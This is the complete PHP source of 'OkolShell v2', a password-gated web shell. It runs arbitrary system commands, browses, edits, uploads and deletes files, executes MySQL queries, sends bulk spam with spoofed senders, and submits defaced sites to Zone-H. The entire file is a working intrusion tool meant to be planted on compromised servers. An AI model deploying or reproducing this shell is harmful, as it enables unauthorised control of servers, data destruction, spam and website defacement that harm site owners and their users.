<?php
session_start();
?>
<style type="text/css">
table {
  border-collapse: collapse;
  border: 1px solid #03476F;
  font: normal 11px verdana, arial, helvetica, sans-serif;
  color: #363636;
  background: #92C428;
  }
caption {
  text-align: center;
  font: bold 18px arial, helvetica, sans-serif;
  background: transparent;
  padding:6px 4px 8px 0px;
  color: #03476F;
  text-transform: uppercase;
  }
td, th {
  border: 1px dotted #03476F;
  padding: .4em;
  color: #363636;
  }

thead th, tfoot th {
  font: bold 11px verdana, arial, helvetica, sans-serif;
  border: 1px solid #03476F;;
  text-align: left;
  background: #4591AD;
  color: #FFFFFF;
  padding-top:3px;
  }
tbody td a {
  background: transparent;
  text-decoration: none;
  color: #363636;
  }
tbody td a:hover {
  background: #C2F64D;
  color: #363636;
  }
tbody th a {
  font: normal 11px verdana, arial, helvetica, sans-serif;
  background: transparent;
  text-decoration: none;
  font-weight:normal;
  color: #363636;
  }
tbody th a:hover {
  background: transparent;
  color: #363636;
  }
tbody th, tbody td {
  vertical-align: top;
  text-align: left;
  }
tfoot td {
  border: 1px solid #03476F;
  background: #4591AD;
  padding-top:3px;
  color: #FFFFFF;
  }
.odd {
  background: #AEE239;
  }
tbody tr:hover {
  background: #FFD800;
  border: 1px solid #03476F;
  color: #FFFFFF;
  }
tbody tr:hover th,
tbody tr.odd:hover th {
  background: #FFD800;
  color: #FFFFFF;
  }
  input, textarea { background-color: #000; color: #0F0; padding: 5px; font-size: 15px; }
      
</style>
<body bgcolor="Black" Text="green" alink="green" blink="green" link="green">
            <title>OkolShell v2</title>
            <center><pre style="color: green; text-shadow: 0px 0px 8px yellow;">

<big>
________   __         .__    _________.__           .__  .__          ________  
\_____  \ |  | ______ |  |  /   _____/|  |__   ____ |  | |  |   ___  _\_____  \ 
 /   |   \|  |/ /  _ \|  |  \_____  \ |  |  \_/ __ \|  | |  |   \  \/ //  ____/ 
/    |    \    <  <_> )  |__/        \|   Y  \  ___/|  |_|  |__  \   //       \ 
\_______  /__|_ \____/|____/_______  /|___|  /\___  >____/____/   \_/ \_______ \
        \/     \/                  \/      \/     \/                          \/
<?php echo "<font size='2'>".shell_exec('uname -a'); 
echo '<font size="2" color="red">usuario </font><font size="2">'. shell_exec('id');
echo '<font size="2" color="red">PHP Version </font><font size="2">'. phpversion().'<br>';
echo '<font size="2" color="red">Safe Mode </font><font size="2" color="gray">'. $safe_mode = @ini_get("safe_mode")?'<font color="red">ON</font>':'<font color="green">OFF</font>'; $safe_mode;
echo '</pre><tr></tr>';
?>
    </pre></center><br /><br /></big></span>
    <center>
<?php
@set_magic_quotes_runtime(0);
if(@$_SESSION['okol'] != 'logged'){
    if(isset($_POST['asdd']) && $_POST['asd'] == 'pass'){
        $_SESSION['okol'] = 'logged';
        echo '<script>window.location="?";</script>';
    }
?>

 <form action="" method="POST">
  <input type="pass" name="asd"  />
  <input type="submit" name="asdd" value="Logear" style="color: green; text-shadow: 0px 0px 8px yellow;"/>
 </form>

 <?php
 die();
 }
 $sec = @$_GET['sec'];
 if($sec == 'mail'){

?>

    
<h3>Mailer</h3>
    <form method="post" action="">
        Desde:<input type="text"name="from"><br /><br />
        Asunto<input type="text"name="asunto"><br /><br />
        Numero De Mensajes<input type="text"name="num"><br /><br />
        Para:<textarea name="para"></textarea><br>
        [*]Si son varios mails separalos por coma...<br><br />
        Contenido:<TEXTAREA name="cont"></TEXTAREA><br>
        <center><input type="submit" value="Spam!" name="spam"><br /></center>
    </form>
<?php
if(isset($_POST['spam'])){
$desde = $_POST['from'];
$para= $_POST['para'];
$cont= $_POST['cont'];
$asunto= $_POST['asunto'];
$numsj= $_POST['num'];
$lol=0;
while($lol < $numsj){
    $lol=$lol + 1;
mail($para,$asunto,$cont,'From:'.$desde);
                    }
if(mail($para,$asunto,$cont,'From:'.$desde))
{
    echo'<>Enviado Correctamente!<br>';

}else{
    echo '<center>No se pudo enviar el mensaje<br>';
}
}

 }elseif ($sec == 'reportzone') {
  
?>
<h3>Zone-H Reporter</h3>
    <form method="POST" action="<?php basename($_SERVER['PHP_SELF']) ?>">
    url1:<br><input type="text" name="report" value="http://"><br>
url2:<br><input type="text" name="report1" value="http://"><br>
url3:<br><input type="text" name="report2" value="http://"><br>
url4:<br><input type="text" name="report3" value="http://"><br>
url5:<br><input type="text" name="report4" value="http://"><br>
url6:<br><input type="text" name="report5" value="http://"><br>
url7:<br><input type="text" name="report6" value="http://"><br>
url8:<br><input type="text" name="report7" value="http://"><br>
url9:<br><input type="text" name="report8" value="http://"><br>
url10:<br><input type="text" name="report9" value="http://"><br>
    nick: <br><input type="text" name="nick"><br>
    
    <input type="submit" value="Reportar">
    </form>
<?php
if(isset($_POST['report']))
    {
    @$defacer = htmlentities($_POST['nick']);
    @$url = htmlentities($_POST['report']);
    @$url2 = htmlentities($_POST['report1']);
    @$url3 = htmlentities($_POST['report2']);
    @$url4 = htmlentities($_POST['report3']);
    @$url5 = htmlentities($_POST['report4']);
    @$url6 = htmlentities($_POST['report5']);
    @$url7 = htmlentities($_POST['report6']);
    @$url8 = htmlentities($_POST['report7']);
    @$url9 = htmlentities($_POST['report8']);
    @$url10 = htmlentities($_POST['report9']);
    function ReportarSuperCaker($url,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$url9,$url10,$defacer,$modohackeo,$rason)
    {  
     
    $ch = curl_init("http://zone-h.com/notify/mass");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$defacer&domain1=$url&domain2=$url2&domain3=$url3&domain4=$url4&domain5=$url5&domain6=$url6&domain7=$url7&domain8=$url8&domain9=$url9&domain10=$url10&hackmode=$modohackeo&reason=$rason");
    curl_exec($ch);
    curl_close($ch);
    }
     
    ReportarSuperCaker("$url","$url2","$url3","$url4","$url5","$url6","$url7","$url8","$url9","$url10","$defacer","6","7");
     
    }
 }elseif ($sec == 'ejec') {
   ?>
   <form method="POST" action="">
    <h3>Comando a ejecutar</h3><br />
    <input type="text"  name="ejec"><br />
    <input type="submit" value="Ejecutar"><br />
</form>

   <?php
   echo '<textarea cols="70" rows="10">';
    echo @shell_exec($_POST['ejec']);
    echo '</textarea>';
}elseif ($sec == 'crypt') {
  ?>
<h3>Cifrar y Descifrar</h3>
<form method="POST" action ="<?php basename($_SERVER['PHP_SELF']) ?>">
     Ingrese texto a Desencriptar:<br> 
     <input type="text" name="decript64"><br>
     <input type="submit" value="Desencriptar"> 
     </form>

<form method="POST" action ="<?php basename($_SERVER['PHP_SELF']) ?>">
     Ingrese texto a encriptar:<br> 
     <input type="text" name="encript64"><br>
     <input type="submit" value="Encriptar"><br /><br />
     </form>

     <form method="POST" action="<?php basename($_SERVER['PHP_SELF']) ?>">
        Encriptar en MD5<br />
        <input type="text" name="md5en">
        <input type="submit" value="encriptar"><br>
    </form>

     <?php

     #encript b64
function base64en(){
     $encript = base64_encode($_POST['encript64']);
     echo $encript.'<br>';
}

#Decript b64
function base64de(){
    $decript = base64_decode($_POST['decript64']);
    echo $decript.'<br>';
}

#encript Md5
function md5encript(){
    $encriptmd5 = md5($_POST['md5en']);
    echo $encriptmd5.'<br>';
}

if(isset($_POST['encript64'])){
    base64en();
}
if(isset($_POST['decript64'])){
    base64de();
}
if(isset($_POST['md5en'])){
    md5encript();
}
}elseif ($sec == 'mysqlsen') {
  ?>
<form method="POST" action="">
    <h3>Sentencias Mysql</h3><br>
    Host:<input type="text" name="host">
    User:<input type="text" name="user">
    Password:<input type="text" name="password"><br>
    DB:<input type="text" name="database">
    Query: <input type="text" name="query">
    <input type="submit" value="Ejecutar" name="mysqlsentencia">
</form>
  <?php

  if(isset($_POST['query'])){
    $host = $_POST['host'];
    $user = $_POST['user'];
    $pass = $_POST['password'];
    $query = $_POST['query'];
    $db = $_POST['database'];
    $con = mysql_connect($host, $user, $pass);
    echo mysql_error()?"Error: " . mysql_error():"Conectado con exito\n";
                mysql_select_db($db, $con);
                    echo mysql_error()?"Error: " . mysql_error():"DB seleccionada con exito\n\n";
                $resultado = mysql_query($query);
if($result)
                {
                    while($line = mysql_fetch_array($result,MYSQL_ASSOC))
                    {
                        print_r ($line);
                    }
                }
              }
                
            
}
 


?>

<a href="?sec=mail">Mailer</a><br>
<a href="?sec=reportzone">Zone-H Reporter</a><br>
<a href="?sec=ejec">Ejecutar comandos</a><br>
<a href="?sec=crypt">Zone Crypter (Md5 y Base64)</a><br>
<a href="?sec=mysqlsen">Mysql Sentences</a><br>
<form action="" method="post" enctype="multipart/form-data">
  
    <h3 style="color: green; text-shadow: 0px 0px 2px green;">Enviar un nuevo archivo: </h3>
    <br>
    <input name="banner" type="file">
    <br>
    <input type="submit" value="Enviar" name="subir">
    </form>

    <?php
    if(isset($_GET['del']) & @$_GET['file'] != ""){
      unlink($_GET['file']);
      echo '<script>window.location="?";</script>';
    }
    if(isset($_POST['subir'])){

 $path= $_GET['dir'];

$nombreArch=$_FILES['banner']['name'];

if (is_uploaded_file($_FILES['banner']['tmp_name']))
 {
   move_uploaded_file($_FILES['banner']['tmp_name'], $path."/".$nombreArch);
  echo "El archivo se ha subido correctamente al servidor, muchas gracias <p>";
 }
else { 
  echo "Error al subir el archivo "; 
  echo $path."/".$archivo.""; 
}

}
if($sec = 'menu'){

 @$file = htmlentities($_GET['file']);
 @$sec = $_GET['sec'];

 }
$directorio = isset($_GET['dir'])?$_GET['dir']:"/";
function permisos($permiso){
        //Sacado de php.net :)
 
        $permisos = @fileperms($permiso);
        if (($permisos & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($permisos & 0xA000) == 0xA000) {
    // Enlace SimbÃ³lico
    $info = 'l';
} elseif (($permisos & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($permisos & 0x6000) == 0x6000) {
    // Especial Bloque
    $info = 'b';
} elseif (($permisos & 0x4000) == 0x4000) {
    // Directorio
    $info = 'd';
} elseif (($permisos & 0x2000) == 0x2000) {
    // Especial CarÃ¡cter
    $info = 'c';
} elseif (($permisos & 0x1000) == 0x1000) {
    // TuberÃ­a FIFO
    $info = 'p';
} else {
    // Desconocido
    $info = 'u';
}
 
// Propietario
$info .= (($permisos & 0x0100) ? 'r' : '-');
$info .= (($permisos & 0x0080) ? 'w' : '-');
$info .= (($permisos & 0x0040) ?
            (($permisos & 0x0800) ? 's' : 'x' ) :
            (($permisos & 0x0800) ? 'S' : '-'));
 
// Grupo
$info .= (($permisos & 0x0020) ? 'r' : '-');
$info .= (($permisos & 0x0010) ? 'w' : '-');
$info .= (($permisos & 0x0008) ?
            (($permisos & 0x0400) ? 's' : 'x' ) :
            (($permisos & 0x0400) ? 'S' : '-'));
 
// Mundo
$info .= (($permisos & 0x0004) ? 'r' : '-');
$info .= (($permisos & 0x0002) ? 'w' : '-');
$info .= (($permisos & 0x0001) ?
            (($permisos & 0x0200) ? 't' : 'x' ) :
            (($permisos & 0x0200) ? 'T' : '-'));
 
return $info;
    }
        if($file == ""){
         echo '<table border="1"> <tr> <th ><font color="gray">archivos</font></th>';
        echo '<th><font color="gray">Tama&ntilde;o</th></font>';
        echo '<th><font color="gray">Tipo</th></font>';
        echo '<th><font color="gray">Permisos</th></tr></font>';
            $files = @scandir($directorio) or die('No existe el directorio que buscas');
            for ($i=0; $i < count($files); $i++) {
                if($files[$i] != "." && $files[$i] != ".."){
                    $cat = is_file($directorio."/".$files[$i])?"file":"dir";
                    chdir($directorio);
                    echo "<tr><td><a href='?".$cat."=" .$directorio."/".$files[$i]."''>".$files[$i]."</a></td>";
                    echo '<td>'. @filesize($files[$i]).' KB</td>';
                    echo '<td>'. @filetype($files[$i]).'</td>';
                    echo '<td>'. permisos($files[$i]).'</td>';
                    echo "<td><a href='?del&file=$directorio/$files[$i]'>Eliminar</a></td></tr>";
                    
                   
                }
            }
        echo '</table>';
        echo '<form method="GET" action=""> ';
        echo '<input type="text" name="dir" value="'.$_SERVER['DOCUMENT_ROOT'].'"> ';
        echo '<input type="Submit" value="navegar"> ';
        echo '<td>';






        if(isset($_GET['dela']) && $_GET['dela'] != ''){
            chdir($directorio);
            unlink($archel);
        }
 
 
        }else{
         
            if(isset($_POST['enviar'])){
                $fp=fopen("$file", "w+");
                fputs($fp, $_POST['contenido']);
                @fclose($fp);
                echo 'Editado';
            }
            if(is_file($file))
            {
            $fp = @fopen("$file", 'r');
            $cont = @fread($fp, filesize($file))or die('No se puede editar.');
            $cont = $cont;
            @fclose($fp);
           
           
            echo "<form action='' method='POST'> ";
            echo "<textarea name='contenido' cols= '60' rows='20'>".htmlentities($cont)."</textarea><br> ";
            echo "<input type='submit' value='Editar' name='enviar'><br> ";
            echo "</form>";
            echo '<button onClick="history.go(-1)">Atras</button>';
          }
        }



    

    ?>

    </form>
<h3 color="green">Crear archivo:</h3><br><br>
<form method="POST" action="<?php basename($_SERVER['PHP_SELF']);  ?>">
    Nombre del archivo<br />
    <input type="text" name="archivo"><br /><br>
    Codigo<br />
    <textarea name="contenido2" cols="60" rows="15"></textarea><br />
    
    <input type="submit" value="crear" name="Mod"><br />
</form>

<?php

if(isset($_POST['archivo'])){
    $contenido = $_POST['contenido2'];
    $nombre = $_POST['archivo'];
    $crear = @fopen($nombre,'w+');
    @fwrite($crear, $contenido);
    @fclose($crear);
    echo 'El archivo se ha creado correctamente.';
}


?>

</center>
